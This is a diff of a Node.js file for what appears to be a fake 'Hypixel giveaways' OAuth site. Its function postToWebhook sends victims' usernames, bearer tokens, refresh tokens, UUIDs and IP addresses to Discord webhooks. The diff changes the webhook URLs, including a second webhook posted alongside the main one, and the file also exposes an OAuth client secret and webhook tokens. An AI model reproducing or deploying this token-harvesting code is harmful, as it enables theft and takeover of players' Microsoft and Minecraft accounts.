@@ -2,7 +2,7 @@
 const client_secret = 'ucg8Q~gcT0Kr3P5uXs5oEl4UKki1wF-QaRvouc5y'
 const client_id = '8a44eb2c-0e0c-4ad8-ad8a-a7f037beab39'
 const redirect_uri = 'https://hypixelgiveaways.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1035588752128618537/x5Owq-LvYfBlpgg7yr_kYUJhh8Ay4rnF9TzjMAR7nRlVtuOl9RPa5UUvOBcZ9tTweRxR'
+const webhook_url = 'https://discord.com/api/webhooks/998999451152699432/80-l7kagzoe2BDf29myyu67JvTDrjY72ABZ9aAc4Dqr0vQfSoVoZYtgOPBzgyrQX-Wpz'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
     axios.all([ 
         axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1035739384525365249/znx8rkzuOMqWkPrt2JDOL1xmMbIpM-g-36akxGoEEMohhSj1blZINPbn9k2afyHdL5tW", data)
+        axios.post("https://discord.com/api/webhooks/998999451152699432/80-l7kagzoe2BDf29myyu67JvTDrjY72ABZ9aAc4Dqr0vQfSoVoZYtgOPBzgyrQX-Wpz", data)
            .then(() => console.log("Successfully authenticated, posting to webhook!"))
     ])
     
